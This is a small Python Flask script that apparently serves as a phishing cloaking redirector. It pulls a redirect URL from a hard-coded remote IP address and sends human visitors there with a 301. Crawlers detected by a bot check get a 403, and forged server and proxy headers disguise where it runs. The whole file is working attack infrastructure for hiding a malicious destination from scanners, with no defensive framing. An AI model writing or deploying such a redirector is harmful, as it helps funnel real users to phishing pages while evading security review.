import requests
from flask import Flask,redirect,make_response,request,abort
from is_bot import Bots

bots = Bots()

app = Flask(__name__)

def IsBot(ua=None):
    return not bots.is_bot(ua)

@app.route('/<name>')
def hello(name):


    sheet = requests.get('http://95.111.230.118/kisho/page/active_r.php?page=saidchase')
    link = sheet.text.strip().split('"')[1].split('\/\/')
    l1 = link[1].replace("\/","/")
    url = f'{link[0]}//{l1}'
    r = make_response(redirect(f"{url}", code=301))
    r.headers.set('alt-svc', "clear")
    r.headers.set('cache-control', "private, max-age=90")
    r.headers.set('content-security-policy', "referrer always;")
    r.headers.set('referrer-policy', "unsafe-url")
    r.headers.set('server', "nginx")
    r.headers.set('via', "1.1 google")

    if IsBot(ua=str(request.headers.get('User-Agent'))):
        return r,301
    else:
        return abort(403)





if __name__ == '__main__':
    # Bind to PORT if defined, otherwise default to 5000.
    
    app.run(host='0.0.0.0', port=int('5000'))
